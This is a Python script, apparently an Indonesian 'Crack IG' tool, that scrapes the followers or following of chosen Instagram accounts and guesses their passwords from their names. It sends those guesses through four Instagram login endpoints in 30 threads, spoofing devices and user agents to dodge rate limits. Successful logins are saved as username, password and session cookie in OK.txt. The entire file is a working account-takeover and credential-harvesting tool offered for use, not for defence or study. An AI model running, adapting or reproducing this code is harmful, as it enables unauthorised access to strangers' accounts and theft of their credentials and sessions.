import urllib.parse
from urllib.parse import quote
import re
import os
import sys
import json
import random
import urllib.request
import hashlib
import time
import uuid
import requests
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel as panel
from rich import print as prints

# Global variables
Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0

# Color codes
WHITE = '\x1b[1;97m'
RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
PURPLE = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
ORANGE = '\033[38;2;255;127;0;1m'
RESET = '\x1b[0m'
campur = random.choice([WHITE, GREEN, YELLOW, BLUE, PURPLE, CYAN, ORANGE, RESET])

# Headers for requests
HEADERS = {
    'Host': 'www.instagram.com',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'x-asbd-id': '129477',
    'x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E',
    'sec-fetch-site': 'same-origin',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
}

ua = {
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)'
}

def clear_screen():
    """Clear the terminal screen"""
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass

def find_res():
    """Find backup cookie from OK.txt or cookie.txt"""
    cookie = None
    try:
        if os.path.isfile('data/OK.txt'):
            with open('data/OK.txt', 'r') as f:
                lines = f.read().splitlines()
                for line in lines:
                    if 'sessionid=' in line:
                        cookie = line.strip()
                        break
        if not cookie and os.path.isfile('data/cookie.txt'):
            with open('data/cookie.txt', 'r') as f:
                cookie = f.read().strip()
    except:
        pass
    return cookie

def setup_instagram():
    """Setup Instagram account with cookies"""
    clear_screen()
    coki = {}
    
    if os.path.isfile('data/cookie.txt'):
        cookie_str = open('data/cookie.txt', 'r').read().strip()
        if cookie_str:
            coki = {'cookie': cookie_str}
    
    if not coki:
        print(f"{RED}[{WHITE}+{RED}] {CYAN}Please enter your Instagram account cookie. Make sure to use a throwaway account!")
        cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
        
        if cookie_input.lower() == 'res':
            cookie_str = find_res()
            if not cookie_str:
                print(f"{RED}Failed to load backup cookie, please enter manually.")
                cookie_input = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Cookie :{YELLOW} ").strip()
                coki = {'cookie': cookie_input}
            else:
                coki = {'cookie': cookie_str}
        else:
            coki = {'cookie': cookie_input}
    
    try:
        uid = re.search('ds_user_id=(\\d+)', str(coki['cookie'])).group(1)
        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki)
        resp.raise_for_status()
        user_data = resp.json().get('user', {})
        full_name = user_data.get('full_name', 'Name Unknown')
        follower_count = user_data.get('follower_count', 0)
        open('data/cookie.txt', 'w').write(coki['cookie'])
        return coki, full_name, follower_count
    except Exception as e:
        print(f"{RED}Invalid cookies or error: {e}")
        os.system('rm -rf data/cookie.txt')
        time.sleep(2)
        return setup_instagram()

def menu():
    """Main menu display"""
    clear_screen()
    aset, nama, fol = setup_instagram()
    print(f"{BLUE}═" * 80)
    print(f"""{campur} 
 _______  ______ _______ _______ _     _      _____  ______
 |       |_____/ |_____| |       |____/         |   |  ____
 |_____  |    \\_ |     | |_____  |    \\_      __|__ |_____|
                                          
{CYAN}╭──────────────────────╮{CYAN}╭───────────────╮{CYAN}╭─────────────────────────╮
{CYAN}│ {CYAN}Author : {GREEN}RAYANXWEB {CYAN}│{CYAN}  │ {WHITE}Version : {GREEN}2.0 {CYAN}│{CYAN}│ {WHITE}Status : {GREEN}Premium{CYAN}    │
{CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
    print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
    
    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
    print(f"{BLUE}═" * 80)
    x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")

    if x in ['01', '1']:
        dump_users(aset, True)
    elif x in ['02', '2']:
        dump_users(aset, False)
    elif x in ['03', '3']:
        crack_file()
    elif x in ['00', '0']:
        os.system("rm data/cookie.txt")
        prints(f"{GREEN}Successfully deleted cookies")
        exit()

def crack_file():
    """Crack from file input"""
    try:
        nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
        with open(nu, 'r') as file:
            for line in file:
                Uuid.append(line.strip())
    except:
        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
        exit()
    print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
    select_method()

def dump_users(cintil, typess):
    """Dump user IDs from followers or following"""
    xyz = []
    
    if 'csrftoken' not in str(cintil):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
            token = memek['config']['csrf_token']
            cintil['cookie'] += ';csrftoken=%s;' % token
        except Exception as e:
            os.system('rm -rf data/cookie.txt')
            exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
    
    prints(panel(f"\n{CYAN}Enter Instagram usernames, use commas for mass cracking", style="Purple"))
    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
    
    try:
        for y in users:
            y = y.strip()
            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
            uid = re.search('"user_id":"(\\d+)"', str(req))
            if uid:
                uid = uid.group(1)
                if uid not in xyz:
                    xyz.append(uid)
    except:
        pass
    
    try:
        for kintil in xyz:
            if typess:
                graphql(True, kintil, cintil['cookie'], '')
            else:
                graphql(False, kintil, cintil['cookie'], '')
    except:
        pass
    
    print("")
    select_method()

def graphql(typess, userid, cokie, after):
    """GraphQL query to get user data"""
    global xx
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if not typess else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
    
    try:
        ptk = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "cookie": cokie
        }
        req = requests.get(api, params=mek, headers=ptk).json()
        
        if 'require_login' in req:
            if len(Uuid) == 0:
                exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
        
        khm = 'edge_followed_by' if typess else 'edge_follow'
        for xyz in req['data']['user'][khm]['edges']:
            username = xyz['node']['username']
            xy = username + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print('\rCollecting Uid {}{}{}                            '.format(RED, len(Uuid), WHITE), end='')
                time.sleep(0.0009)
        
        end = req['data']['user'][khm]['page_info']['has_next_page']
        if end:
            after = req['data']['user'][khm]['page_info']['end_cursor']
            graphql(typess, userid, cokie, after)
    except:
        pass

def select_method():
    """Select cracking method"""
    global SistemLog
    prints(panel(f"""\n{RED}[ {BLUE}Select the method to use{RED} ]\n\n{RED}[{CYAN}01{RED}] {WHITE}www.instagram.com method {GREEN}Recommended{WHITE}
{RED}[{CYAN}02{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}03{RED}] {WHITE}i.instagram.com method
{RED}[{CYAN}04{RED}] {WHITE}b.i.instagram.com method""", style="Purple"))
    method = input(f"\n{RED}[{WHITE}+{RED}]{BLUE} Select Menu : {YELLOW}")
    
    if method in ['01', '1']:
        SistemLog = "api.instagram.com"
    elif method in ['02', '2']:
        SistemLog = "i.instagram.com"
    elif method in ['03', '3']:
        SistemLog = "www.instagram.com"
    elif method in ['04', '4']:
        SistemLog = "b.i.instagram.com"
    else:
        SistemLog = "api.instagram.com"
    start_cracking()

def start_cracking():
    """Start the cracking process with thread pool"""
    print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
    
    with ThreadPoolExecutor(max_workers=30) as ASF:
        for i in Uuid:
            try:
                username, name = i.split('|')
                password_list = generate_passwords(name)
                
                if SistemLog == "api.instagram.com":
                    ASF.submit(crack_api, username, password_list)
                elif SistemLog == "i.instagram.com":
                    ASF.submit(crack_i, username, password_list)
                elif SistemLog == "www.instagram.com":
                    ASF.submit(crack_w, username, password_list)
                elif SistemLog == "b.i.instagram.com":
                    ASF.submit(crack_b, username, password_list)
            except:
                pass
    
    exit(f' \n\n {GREEN}Cracking completed')

def generate_passwords(name):
    """Generate password list based on name"""
    xxzx = []
    
    for nama in name.split(' '):
        nama = nama.lower()
        if len(nama) < 3:
            continue
        elif len(nama) in [3, 4, 5]:
            xxzx.append(nama + '123')
            xxzx.append(nama + '26')
            xxzx.append(nama + '1234')
            xxzx.append('wonosobo' + '123')
            xxzx.append('skorsa99')
            xxzx.append(nama + '2008')
            xxzx.append('wonosobo12345')
            xxzx.append('wonosobo' + '1234')
            xxzx.append(nama + '28')
            xxzx.append(nama + '2009')
            xxzx.append(nama + '456')
            xxzx.append(nama.capitalize() + '789')
            xxzx.append('katasandi')
            xxzx.append(nama.capitalize() + 'cantik')
            xxzx.append(nama.capitalize() + '1234')
            xxzx.append(nama.capitalize() + '29')
            xxzx.append(nama.capitalize() + '12')
            xxzx.append(nama.capitalize() + '123456')
            xxzx.append(nama.capitalize() + '123')
            xxzx.append(nama.capitalize() + '12345')
        else:
            xxzx.append(nama)
            xxzx.append(name)
            xxzx.append(nama + '1234')
            xxzx.append(nama + '12345')
            xxzx.append(nama + '123456789')
            xxzx.append(nama + '99')
            xxzx.append(nama + '12')
            xxzx.append(nama + '123456')
            xxzx.append(nama.capitalize() + '321')
            xxzx.append(nama + '34')
            xxzx.append(nama + '2009')
            xxzx.append(nama + '28')
            xxzx.append(nama + '29')
            xxzx.append('wonosobo12345')
            xxzx.append('wonosobo' + '1234')
            xxzx.append(nama + '20')
            xxzx.append(nama + '2008')
            xxzx.append(nama + '2010')
            xxzx.append(nama.capitalize() + '123')
            xxzx.append(nama.capitalize() + '12345')
    
    return xxzx

def get_user_data(name):
    """Get user data from Instagram"""
    post = peng = meng = mail = fullname = fbid = phone = None
    
    for y in name.split(','):
        try:
            HEADERS.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
                'x-ig-app-id': '1217981644879628'
            })
            profil_info_target = requests.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS).json()['data']['user']
            post = profil_info_target["edge_owner_to_timeline_media"]["count"]
            peng = profil_info_target["edge_followed_by"]["count"]
            meng = profil_info_target["edge_follow"]["count"]
            mail = profil_info_target.get("business_email")
            phone = profil_info_target.get("business_phone_number")
            fullname = profil_info_target["full_name"]
            fbid = profil_info_target["fbid"]
        except:
            pass
    
    return post, peng, meng, mail, fullname, fbid, phone

def random_user_agent():
    """Generate random user agent for Instagram"""
    android_version = random.choice(["27/9","27/10","27/11","27/12"])
    dpi = random.choice(['240dpi','320dpi','400dpi','480dpi'])
    pxl = random.choice(['720x1280','1080x1920','1440x2560'])
    brand = random.choice(['samsung','xiaomi','oneplus','google'])
    model = random.choice(['SM-G991B','SM-G998B','Pixel 6','OnePlus 9'])
    ig_version = random.choice(["70.0.0.15.98", "80.0.0.20.101"])
    locale = random.choice(['id_ID','en_US','en_GB'])
    
    ua1 = f'Instagram {ig_version} Android ({android_version}; {dpi}; {pxl}; {brand}; {model})'
    ua2 = f'Instagram {ig_version} (iPhone; iOS 17_5_1; {locale}; scale=3.00; {pxl})'
    
    return random.choice([ua1, ua2])

def crack_api(username, memek):
    """Crack using API method"""
    global Ok, Cp, Loop
    
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    
    for password in memek:
        try:
            ses = requests.Session()
            cok = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                         headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 360.0.0.33.104'}).cookies.get_dict()
            cooki = ("; ").join([f"{key}={value}" for key, value in cok.items()])
            csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items())[0][1]
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F81 Instagram 317.0.4.27.109 (iPhone18,1; iOS 26_5_1; en_US; en; scale=3.00; 960x2079; 562830928) NW/3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-csrftoken': f'{csrf}',
                'x-ig-app-id': '1217981644879628',
                'x-asbd-id': '129477',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'Cookie': cooki
            }
            
            data = f'enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.parse.quote(str(username))}'
            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
            
            if 'userId' in str(response.text):
                kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"                                                               ", end='\r')
                time.sleep(0.10)
                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\n{BLUE}Authorization: {WHITE}{kuki}{WHITE}\n")
                Ok += 1
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{kuki}\n")
                break
            elif 'checkpoint' in str(response.text):
                Cp += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"\r {WHITE}Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n {WHITE}Followers: {BLUE}{peng}{WHITE}\n Following: {BLUE}{meng}{WHITE}")
                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    
    Loop += 1

def crack_i(username, memek):
    """Crack using i.instagram.com method"""
    global Ok, Cp, Loop
    
    sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    
    for password in memek:
        try:
            ses = requests.Session()
            useragent = random_user_agent()
            device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            
            data = {
                'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"' + str(device_id) + '","server_config_retrieval":"1"}',
                'ig_sig_key_version': '4'
            }
            
            ses.headers.update({
                'X-Pigeon-Session-Id': str(uuid.uuid4()),
                'X-IG-Connection-Type': 'MOBILE(LTE)',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': useragent,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
            })
            
            response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data=data)
            
            try:
                _csrftoken = ses.cookies.get_dict()['csrftoken']
            except:
                _csrftoken = ''
            
            data2 = f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba.%7B%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22password%22%3A%22{urllib.parse.quote(str(password))}%22%2C%22_csrftoken%22%3A%22{urllib.parse.quote(str(_csrftoken))}%22%7D&ig_sig_key_version=4'
            
            response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data2, allow_redirects=True)
            
            if 'logged_in_user' in response2.text or 'sessionid' in ses.cookies.get_dict().keys():
                try:
                    ig_set_authorization = response2.headers['ig-set-authorization']
                except:
                    ig_set_authorization = None
                
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"                                                               ", end='\r')
                time.sleep(0.10)
                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
                break
            elif 'challenge_required' in response2.text:
                Cp += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    
    Loop += 1

def crack_w(username, memek):
    """Crack using www.instagram.com method"""
    global Ok, Cp, Loop
    
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    
    for password in memek:
        try:
            ses = requests.Session()
            uag = random_user_agent()
            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            
            ses.headers.update({
                'x-fb-http-engine': 'Liger',
                'Host': 'i.instagram.com',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-device-id': device_id,
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'user-agent': uag,
                'x-ig-family-device-id': family_device_id,
                'x-ig-app-id': '3419628305025917',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
            })
            
            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}%22%2C%22contact_point%22%3A%22{urllib.parse.quote(str(username))}%22%7D%7D')
            
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
            resp_text = response.text.replace('\\', '')
            
            if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
                try:
                    ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', resp_text).group(1)
                    decode_cookie = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
                    cookies = ";".join([f"{k}={v}" for k, v in decode_cookie.items()])
                except:
                    cookies = '-'
                
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"                                                               ", end='\r')
                time.sleep(0.10)
                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{BLUE}\nCookie: {WHITE}{cookies}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
                break
            elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
                Cp += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"\r Username: {BLUE}{username}{WHITE}\n Password:{BLUE} {password}\n Followers: {BLUE}{peng}{WHITE}\n Following:{BLUE}{meng}{WHITE}")
                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    
    Loop += 1

def crack_b(username, memek):
    """Crack using b.i.instagram.com method"""
    global Ok, Cp, Loop
    
    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} api2 {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
    sys.stdout.flush()
    
    for password in memek:
        try:
            ua2 = random_user_agent()
            ses = requests.Session()
            device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            
            ses.headers.update({
                'authority': 'i.instagram.com',
                'x-ig-capabilities': '3brTv10=',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'user-agent': ua2,
                'x-ig-device-id': device_id,
                'x-ig-app-id': '567067343352427',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
            })
            
            data = f'signed_body=SIGNATURE.%7B%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.parse.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.parse.quote(str(username))}%22%2C%22device_id%22%3A%22android-{urllib.parse.quote(str(_hash.hexdigest()[:16]))}%22%7D'
            
            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
            
            if 'logged_in_user' in response.text and '"pk_id":' in response.text:
                ig_set_authorization = response.headers.get('ig-set-authorization')
                Ok += 1
                post, peng, meng, mail, fullname, fbid, phone = get_user_data(username)
                print(f"                                                               ", end='\r')
                time.sleep(0.10)
                print(f"\r{BLUE}FullName: {GREEN}{fullname[:10] if fullname else '?'}{BLUE}\nUsername: {GREEN}{username}{BLUE}\nPassword: {GREEN}{password}{BLUE}\nFollowers: {GREEN}{peng}{BLUE}\nFollowing: {GREEN}{meng}\n{BLUE}Posts: {GREEN}{post}{BLUE}\nfb_id: {GREEN}{fbid}{WHITE}\n{BLUE}Authorization: {WHITE}{ig_set_authorization}{WHITE}\n")
                open('data/OK.txt', 'a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
                break
            elif 'challenge_required' in response.text or '/challenge/' in response.text:
                Cp += 1
                print(f"\r Username:{BLUE} {username}{WHITE}\n Password: {BLUE}{password}\n")
                open('data/CP.txt', 'a').write('%s|%s\n' % (username, password))
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    
    Loop += 1

if __name__ == '__main__':
    try:
        os.mkdir('data')
    except:
        pass
    
    try:
        menu()
    except requests.exceptions.ConnectionError:
        print('Connection Close')
